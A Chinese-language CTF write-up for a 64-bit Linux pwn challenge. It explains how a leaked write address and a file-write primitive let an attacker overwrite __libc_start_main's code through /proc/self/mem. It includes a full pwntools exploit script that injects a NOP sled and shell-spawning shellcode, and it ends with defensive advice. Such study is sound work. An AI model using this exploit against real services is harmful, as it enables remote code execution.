# blind

## 题目简述

64 位 Linux 程序允许用户指定文件、偏移和写入内容，同时启动时泄露了 `write` 的运行地址。虽然题目没有直接提供代码执行入口，但 Linux 的 `/proc/self/mem` 表示当前进程的虚拟内存；只要程序以可写方式打开它，就能绕过普通文件权限，改写本进程的代码页。

## 解题过程

先用泄露的 `write` 地址确定远端 libc。本题官方环境为 glibc 2.27，因此可由符号偏移计算 libc 基址与 `__libc_start_main` 地址：

```text
libc_base = leaked_write - libc.symbols["write"]
target    = libc_base + libc.symbols["__libc_start_main"]
```

程序提供的写文件功能依次输入：

```text
文件名：/proc/self/mem
偏移：  __libc_start_main 的运行地址
内容：  NOP sled + shellcode
```

`__libc_start_main` 此时仍在当前调用链中。覆盖一段足够长的函数代码后，执行流继续落入被改写区域，再沿 NOP sled 滑到末尾的 shellcode。下面整理了官方脚本，补全了缺失导入，并改为使用题目随附的 libc；远程地址和端口需替换为实际实例：

```python
#!/usr/bin/env python3
import hashlib
import string

from pwn import *
from pwnlib.util.iters import mbruteforce

context.arch = "amd64"
context.os = "linux"

HOST = "challenge.host"
PORT = 0

io = remote(HOST, PORT)
libc = ELF("./libc-2.27.so", checksec=False)

# 题目使用 4 字符 SHA-256 Proof of Work。
io.recvuntil(b") == ")
digest = io.recvline().strip().decode()
proof = mbruteforce(
    lambda value: hashlib.sha256(value.encode()).hexdigest() == digest,
    string.printable,
    4,
    method="fixed",
)
io.sendlineafter(b"????> ", proof.encode())

io.recvuntil(b"write: ")
write_addr = int(io.recvline().strip(), 16)
libc.address = write_addr - libc.sym["write"]
target = libc.sym["__libc_start_main"]
log.success(f"libc base = {libc.address:#x}")
log.success(f"overwrite target = {target:#x}")

io.sendlineafter(b">> ", b"/proc/self/mem")
io.sendlineafter(b">> ", str(target).encode())

shellcode = asm(shellcraft.sh())
payload = shellcode.rjust(0x300, asm("nop")) + b"\n"
io.sendafter(b">> ", payload)

io.interactive()
```

进入 shell 后执行 `cat` 读取题目环境中的 flag 文件即可。若远端 libc 与附件不同，必须重新用 `write` 泄露匹配版本；错误的符号偏移会直接把 shellcode 写入无关地址。

## 方法总结

`/proc/self/mem` 是一种“任意虚拟地址写”放大器：一旦进程替攻击者打开它并允许控制偏移，原本只写普通文件的功能就会变成代码改写能力。防护重点是限制可访问路径、使用 `openat2()` 等机制约束解析范围，并避免让用户同时控制目标文件、偏移和内容。利用侧则要把地址泄露、libc 识别、稳定落点和 NOP sled 串成完整链路。
